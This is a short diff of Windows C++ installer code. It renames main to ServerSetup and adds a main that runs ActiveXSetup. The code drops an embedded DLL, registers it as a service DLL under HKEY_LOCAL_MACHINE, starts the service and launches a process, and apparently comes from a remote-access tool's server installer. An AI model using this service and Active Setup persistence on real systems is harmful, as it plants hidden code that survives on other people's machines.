@@ -5,8 +5,6 @@
 #include <Windows.h>
 #include "resource.h"
 #include "RegEditEx.h"
-
-
 bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
 {
 	DWORD dwWritten;
@@ -148,7 +146,7 @@ void StartService(LPCTSTR lpService)
 }
 
 
-int main()
+int ServerSetup()
 {
 
 	//CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
@@ -219,7 +217,6 @@ int main()
 	//写入服务的描述
 	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
 
-	printf("123");
 	if (schService != NULL)
 	{
 		CreateEXE(strModulePath, IDR_DLL1, "DLL");
@@ -311,4 +308,11 @@ void ActiveXSetup()
 	StartInfo.wShowWindow = SW_SHOWNORMAL;
 	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);
 	return;
+}
+
+int main()
+{
+	// TODO: Place code here.
+	ActiveXSetup();
+	return 0;
 }
